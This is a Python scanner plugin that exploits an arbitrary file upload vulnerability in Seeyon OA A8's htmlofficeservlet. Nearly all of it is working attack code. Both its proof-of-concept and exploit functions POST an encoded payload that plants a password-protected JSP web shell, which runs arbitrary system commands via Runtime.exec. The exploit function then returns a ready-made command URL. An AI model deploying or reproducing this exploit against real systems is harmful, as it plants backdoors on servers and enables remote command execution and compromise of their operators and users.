# -*- coding: UTF-8 -*-
#!/usr/bin/python
import requests
import urllib.request
def vuln_info():
    info={
        'vuln_name': '致远OA A8 htmlofficeservlet 任意文件上传漏洞',  #漏洞名称
        'vuln_referer':'未知',  #漏洞来源
        'vuln_author':'未知',  #插件作者
        'cms_name':'test',#cms_name需要和上级目录保持一致。扫描器自动添加会调用。GUI版本不会调用
        'vuln_description':'''漏洞描述''',
        'vuln_identifier':'''漏洞编号。''',
        'vuln_class':'漏洞分类',#如：信息泄漏、远程命令执行、任意文件上传、SQL注入、XML注入、任意文件读取、本地文件包含、认证绕过/未认证、弱口令、目录遍历、其他、反序列化漏洞、OGNL表达式注入、SSRF、后门、任意文件下载、鉴权绕过、暴力破解、命令注入、路径泄露、XSS、远程文件包含、CSRF、任意文件包含、代码注入、任意文件写入、密码硬编码、文件包含、任意用户注册、缓冲区溢出、用户枚举漏洞、任意文件删除、任意页面上传、管理权限等
        'vuln_solution':'''修复建议。''',
        'FofaQuery_type':'socket', #socket、httpx
        'FofaQuery_link':'/', #此处的路径会加在url拼接访问，进行FofaQuery的条件匹配 此处为all为全部页面都检测
        'FofaQuery_rule':'title="百度"',#header="JSESSIONID" || body="Struts Problem Report" || body="There is no Action mapped for namespace" || body="No result defined for action and result input" || header="Servlet" || header="JBoss",port="60001"
        #header', 'body', 'title', 'banner','port','banner','service','protocol','server'
        'ispoc':1, #是否有poc  1为有 0为无
        'isexp':1  #是否有exp   1为有 0为无
    }
    return info

def do_poc(url,hostname,port,scheme,heads={},func_out=print,plugins_temp_data={}):
    try:
        # 返回参数
        #Result返回是否存在，
        #Result_Info为返回的信息，可以为Paylaod
        #Debug debug信息 默认不会显示，勾选显示调试信息会输出此结果
        #Error_Info无论何时都会输出
        result = {"Result":False,"Result_Info":"payload"}
        data ='''
DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV\r
OPTION=S3WYOSWLBSGr\r
currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r
CREATEDATE=wUghPB3szB3Xwg66\r
RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r
originalFileId=wV66\r
originalCreateDate=wUghPB3szB3Xwg66\r
FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6\r
needReadFile=yRWZdAS6\r
originalCreateDate=wLSGP4oEzLKAz4=iz=66\r
<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%>
<%!public static String excuteCmd(String c) 
{StringBuilder line = new StringBuilder();
try {Process pro = Runtime.getRuntime().exec(c);
BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));
String temp = null;
while ((temp = buf.readLine()) != null) 
{line.append(temp+"\\n");}
buf.close();} 
catch (Exception e) {line.append(e.getMessage());}
return line.toString();} %>
<%if("calsee".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd")))
{out.println("<pre>"+excuteCmd(request.getParameter("cmd")) +"</pre>");}
else{out.println(":-)");}%>>a6e4f045d4b8506bf492ada7e3390d7ce
'''
        res = requests.post(url + '/seeyon/htmlofficeservlet',data=data,headers=heads, timeout=10, verify=False)
        if 'getParameter' in res.text and requests.get(url + "/seeyon/testtesta.jsp").status_code == 200:
            result['Result'] =True
            result['Result_Info'] = '/seeyon/htmlofficeservlet'
        return result
    except Exception as e:
        func_out('Error',str(e)+str(e.__traceback__.tb_lineno)+'行')


def do_exp(url,hostname,port,scheme,heads={},exp_data={},func_out=print,plugins_temp_data={}):
    try:
        result = {"Result":False,"Result_Info":"payload"}
        if exp_data['type']=='uploadfile':
            data ='''
DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV\r
OPTION=S3WYOSWLBSGr\r
currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r
CREATEDATE=wUghPB3szB3Xwg66\r
RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r
originalFileId=wV66\r
originalCreateDate=wUghPB3szB3Xwg66\r
FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6\r
needReadFile=yRWZdAS6\r
originalCreateDate=wLSGP4oEzLKAz4=iz=66\r
<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%>
<%!public static String excuteCmd(String c) 
{StringBuilder line = new StringBuilder();
try {Process pro = Runtime.getRuntime().exec(c);
BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));
String temp = null;
while ((temp = buf.readLine()) != null) 
{line.append(temp+"\\n");}
buf.close();} 
catch (Exception e) {line.append(e.getMessage());}
return line.toString();} %>
<%if("calsee".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd")))
{out.println("<pre>"+excuteCmd(request.getParameter("cmd")) +"</pre>");}
else{out.println(":-)");}%>>a6e4f045d4b8506bf492ada7e3390d7ce
'''

            res = requests.post(url + '/seeyon/htmlofficeservlet',data=data,headers=heads, timeout=10, verify=False)
            if 'getParameter' in res.text and requests.get(url + "/seeyon/testtesta.jsp").status_code == 200:
                    result['Result'] = True
                    result['Result_Info'] = '上传成功\n上传路径为:' + url + "/seeyon/testtesta.jsp?pwd=calsee&cmd=cmd+/c+dir"
        return result
    except Exception as e:
        func_out('Error',str(e)+str(e.__traceback__.tb_lineno)+'行')

